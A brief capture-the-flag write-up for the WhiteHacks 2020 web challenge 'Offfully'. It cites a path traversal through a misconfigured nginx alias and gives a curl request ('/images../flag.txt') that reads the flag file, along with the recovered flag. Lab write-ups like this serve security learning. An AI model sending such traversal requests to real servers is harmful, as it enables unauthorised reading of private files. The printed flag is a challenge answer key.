# Offfully
Web

## Challenge 

DESCRIPTION
We provided the configuration file below. Can you access flag.txt?

Visit the challenge at http://chals.whitehacks.ctf.sg:13000/

Author: gladiator


ATTACHED FILES
default


## Solution

https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/

Path traversal via misconfigured NGINX alias


	$ curl http://chals.whitehacks.ctf.sg:13000/images../flag.txt
	WH2020{0FF_BY_TW0_D0Ts_AND_A_SLASH}
